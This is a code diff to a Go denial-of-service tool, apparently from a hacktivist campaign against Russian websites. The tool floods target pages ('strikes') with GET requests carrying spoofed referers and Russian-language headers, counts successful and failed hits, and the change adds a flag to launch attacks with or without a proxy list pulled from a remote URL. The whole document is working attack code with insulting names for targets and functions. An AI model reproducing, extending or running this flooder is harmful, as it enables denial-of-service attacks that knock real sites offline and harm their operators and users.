@@ -79,6 +79,7 @@ var (
 	proxyClients       sync.Map
 	currProxyListId    int32
 	randProxy          bool
+	useProxy           bool
 
 	headersReferers []string = []string{
 		"http://www.google.com/?q=",
@@ -104,6 +105,7 @@ func main() {
 	flag.DurationVarP(&refresh, "refresh", "r", 3*time.Second, "Screen refresh interval in seconds")
 	flag.StringVarP(&proxyUrl, "proxies-url", "p", "https://hutin-puy.nadom.app/proxy.json", "URL to fetch proxy list from `proxies-url`")
 	flag.BoolVarP(&randProxy, "random-proxy", "x", false, "Use random proxy from list")
+	flag.BoolVarP(&useProxy, "use-proxy", "n", false, "Use proxy")
 	flag.DurationVarP(&recheckInterval, "recheck", "c", 60*time.Second, "Failed Atack refresh interval in seconds")
 	flag.Parse()
 
@@ -175,7 +177,9 @@ func main() {
 		os.Exit(0)
 	}
 
-	startProxyListRefresher(&proxyUrl)
+	if useProxy {
+		startProxyListRefresher(&proxyUrl)
+	}
 	startStatsPrinter(&statData, strikeList, &refresh, &ipEcho)
 
 	for {
@@ -185,17 +189,19 @@ func main() {
 		go func() {
 			defer func() { <-refresher }()
 
-			if len(proxyList) == 0 {
+			if len(proxyList) == 0 && useProxy {
 				fmt.Println("proxy list is empty... retrying...")
 				time.Sleep(time.Second)
 				return
 			}
-
-			pId := atomic.LoadInt32(&currProxyListId)
-		P:
-			if atomic.LoadInt32(&proxyList[pId].errCnt) > 30 {
-				pId = atomicNextProxy(pId)
-				goto P
+			var pId int32
+			if useProxy {
+				pId = atomic.LoadInt32(&currProxyListId)
+			P:
+				if atomic.LoadInt32(&proxyList[pId].errCnt) > 30 {
+					pId = atomicNextProxy(pId)
+					goto P
+				}
 			}
 
 			nowT := time.Now()
@@ -222,6 +228,10 @@ func main() {
 					atomic.StoreInt32(&strike.errCnt, 0)
 				}
 
+				var pr *proxyItem
+				if useProxy {
+					pr = proxyList[pId]
+				}
 				go func(huilo *strikeItem, proxy *proxyItem) {
 					defer func() { <-limiter }()
 
@@ -229,7 +239,7 @@ func main() {
 						time.Sleep(100 * time.Millisecond)
 						return
 					}
-					if err := russiaWarShipFuckYou(*huilo, *proxy); err != nil {
+					if err := russiaWarShipFuckYou(*huilo, proxy); err != nil {
 						atomic.AddInt32(&site.failCnt, 1)
 						if !(strings.Contains(err.Error(), "Payment Required") || strings.Contains(err.Error(), "Proxy Authentication Required")) {
 							atomic.AddInt32(&huilo.errCnt, 1)
@@ -238,7 +248,7 @@ func main() {
 						atomic.AddInt32(&site.succCnt, 1)
 						atomic.StoreInt32(&huilo.errCnt, 0)
 					}
-				}(strike, proxyList[pId])
+				}(strike, pr)
 			}
 
 			_ = atomicNextProxy(pId)
@@ -247,6 +257,9 @@ func main() {
 }
 
 func atomicNextProxy(pid int32) (newInt int32) {
+	if !useProxy {
+		return
+	}
 	if randProxy {
 		newInt = rand.Int31n(int32(len(proxyList)))
 		atomic.StoreInt32(&currProxyListId, newInt)
@@ -549,7 +562,7 @@ func (ii *ipInfo) refreshIpInfo(echoUrl *string) error {
 	return nil // ipEcho.String()
 }
 
-func russiaWarShipFuckYou(huilo strikeItem, pr proxyItem) error {
+func russiaWarShipFuckYou(huilo strikeItem, pr *proxyItem) error {
 	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
 	if err != nil {
 		fmt.Printf("couldn't create new request: %v\n", err)
@@ -569,7 +582,7 @@ func russiaWarShipFuckYou(huilo strikeItem, pr proxyItem) error {
 	req.Header.Set("Accept-Language", "ru")
 	req.Header.Set("Accept", "application/json, text/plain, */*")
 
-	cl, _, err := proxyClient(&pr)
+	cl, _, err := proxyClient(pr)
 	if err != nil {
 		fmt.Printf("proxyClient error: %v\n", err.Error())
 		return fmt.Errorf("proxyClient error: %v\n", err.Error())
@@ -611,6 +624,10 @@ func initVariables() {
 }
 
 func proxyClient(pr *proxyItem) (*http.Client, *proxyItem, error) {
+	if !useProxy {
+		return noProxyClient, nil, nil
+	}
+
 	if pr == nil {
 		if len(proxyList) == 0 {
 			return nil, nil, fmt.Errorf("proxyList is empty!")
